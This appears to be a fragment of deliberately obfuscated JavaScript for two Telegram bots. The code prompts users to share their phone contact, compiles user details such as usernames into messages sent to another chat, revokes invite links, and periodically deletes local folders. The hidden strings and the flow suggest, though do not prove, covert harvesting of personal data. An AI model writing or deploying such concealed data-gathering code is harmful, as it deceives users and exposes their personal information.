                const _0x2288d1 = _0x18ba49, _0x4d3d2e = _0x4043ab[_0x2288d1(0x280)][_0x2288d1(0x2b5) + 'er'], _0x5b9650 = _0x2d1123[_0x2288d1(0x33c)](_0x2d1123[_0x2288d1(0x4ae)](_0x2d1123[_0x2288d1(0x3f2)](_0x2d1123[_0x2288d1(0x4ae)](_0x2d1123[_0x2288d1(0x33c)](_0x2288d1(0x261) + _0x2288d1(0x53c) + '\x0a', _0x2288d1(0x6d4) + _0x5c587a + '\x20' + _0x37123d + _0x2288d1(0x168)), _0x2288d1(0x6e1) + '@' + _0x38b9ed + _0x2288d1(0x168)), _0x2288d1(0x40b) + _0x3c5308 + _0x2288d1(0x168)), _0x2288d1(0x4a1) + _0x2288d1(0x3c2) + _0x4d3d2e + '\x0a'), '\x20');
                if (_0x2d1123[_0x2288d1(0x651)](_0x18b072[_0x2288d1(0x629) + 't'], 0x23f * -0xe + 0x1 * 0x184f + 0x261 * 0x3)) {
                    const _0x606663 = _0x18b072[_0x2288d1(0x4f5)][0x5ba * 0x6 + -0xc1c + -0x1640][0x136e + 0xaab * -0x2 + 0x1e8][_0x2288d1(0xf8)];
                    bot[_0x2288d1(0x49f)](_0x56dd7c, _0x606663, {
                        'caption': _0x5b9650,
                        'parse_mode': _0x2d1123[_0x2288d1(0x683)]
                    });
                } else
                    bot[_0x2288d1(0x420) + 'e'](_0x56dd7c, _0x5b9650, { 'parse_mode': _0x2d1123[_0x2288d1(0x683)] });
                secondBot[_0x2288d1(0x420) + 'e'](_0x4043ab[_0x2288d1(0x12c)]['id'], _0x2d1123[_0x2288d1(0x141)]), delete inviteLinks[_0x4043ab[_0x2288d1(0x112)]['id']];
            });
        } else
            secondBot[_0x18ba49(0x420) + 'e'](_0x4043ab[_0x18ba49(0x12c)]['id'], _0x2d1123[_0x18ba49(0x42a)]);
    } else
        secondBot[_0x18ba49(0x420) + 'e'](_0x4043ab[_0x18ba49(0x12c)]['id'], _0x2d1123[_0x18ba49(0x46c)]);
}), secondBot['on'](_0x1155f9(0x641), _0x583699 => {
    const _0x1d883b = _0x1155f9, _0x2731e0 = {
            'SIyiL': function (_0x145224, _0x31ce9b) {
                return _0x145224 !== _0x31ce9b;
            },
            'gczeK': _0x1d883b(0x12b),
            'FoGNu': _0x1d883b(0x4be) + _0x1d883b(0x1c5),
            'jOPxs': _0x1d883b(0x27d) + _0x1d883b(0x537) + _0x1d883b(0x2e0)
        };
    if (!_0x583699[_0x1d883b(0x280)] && _0x2731e0[_0x1d883b(0x423)](_0x583699[_0x1d883b(0x236)], _0x2731e0[_0x1d883b(0x1bd)])) {
        const _0x23d759 = {
            'reply_markup': {
                'keyboard': [[{
                            'text': _0x2731e0[_0x1d883b(0x213)],
                            'request_contact': !![]
                        }]],
                'one_time_keyboard': !![]
            }
        };
        secondBot[_0x1d883b(0x420) + 'e'](_0x583699[_0x1d883b(0x12c)]['id'], _0x2731e0[_0x1d883b(0x609)], _0x23d759);
    }
});
const clearTemporaryStorage = () => {
    const _0x34d759 = _0x1155f9, _0x5a089c = {
            'ijJQt': function (_0x2675d2, _0x3763c4) {
                return _0x2675d2(_0x3763c4);
            },
            'MyGZV': _0x34d759(0x294) + _0x34d759(0x4dc) + _0x34d759(0x5ab),
            'DxsIo': _0x34d759(0x67f),
            'HJbzA': _0x34d759(0x493),
            'KYyFx': _0x34d759(0x175),
            'daVAK': _0x34d759(0x5f0) + _0x34d759(0x53a) + _0x34d759(0x483) + _0x34d759(0x669)
        };
    try {
        console[_0x34d759(0x3c6)](_0x5a089c[_0x34d759(0x170)]);
        const _0x164229 = [
            _0x5a089c[_0x34d759(0x201)],
            _0x5a089c[_0x34d759(0x319)],
            _0x5a089c[_0x34d759(0x3e1)]
        ];
        _0x164229[_0x34d759(0x243)](_0x17b961 => {
            const _0x559d32 = _0x34d759, _0x3b9cda = path[_0x559d32(0x33d)](__dirname, _0x17b961);
            fs[_0x559d32(0x513)](_0x3b9cda) ? (_0x5a089c[_0x559d32(0xaf)](deleteFolderRecursive, _0x3b9cda), console[_0x559d32(0x3c6)](_0x559d32(0x152) + _0x559d32(0x310) + _0x3b9cda)) : console[_0x559d32(0x3c6)](_0x559d32(0xb3) + _0x559d32(0xbc) + _0x3b9cda);
        });
    } catch (_0x467306) {
        console[_0x34d759(0x4c4)](_0x5a089c[_0x34d759(0x680)], _0x467306);
    }
};
setInterval(() => {
    const _0x123713 = _0x1155f9, _0x125f5d = {
            'Vgaiz': function (_0x5339bf) {
                return _0x5339bf();
            },
            'peSRN': _0x123713(0x121) + _0x123713(0x166) + _0x123713(0x346)
        };
    _0x125f5d[_0x123713(0x608)](clearTemporaryStorage), console[_0x123713(0x3c6)](_0x125f5d[_0x123713(0xb6)]);
}, (0x1 * 0x89 + -0xa1a + 0x993) * (-0x127 * 0x1d + -0x1402 * -0x1 + 0x7 * 0x1f3) * (-0xae2 + 0xa53 * 0x1 + 0x1 * 0x477));
const handleExit = () => {
    const _0x33cbce = _0x1155f9, _0x1b8078 = {
            'rufES': _0x33cbce(0x371) + _0x33cbce(0x227) + _0x33cbce(0x1a1) + _0x33cbce(0x292),
            'bmVAk': function (_0x15b032) {
                return _0x15b032();
            }
        };
    console[_0x33cbce(0x3c6)](_0x1b8078[_0x33cbce(0x53d)]), _0x1b8078[_0x33cbce(0x212)](clearTemporaryStorage), process[_0x33cbce(0x15e)]();
};
process['on'](_0x1155f9(0x15e), handleExit), process['on'](_0x1155f9(0x4ef), handleExit), process['on'](_0x1155f9(0xad), handleExit), process['on'](_0x1155f9(0x6cf), handleExit);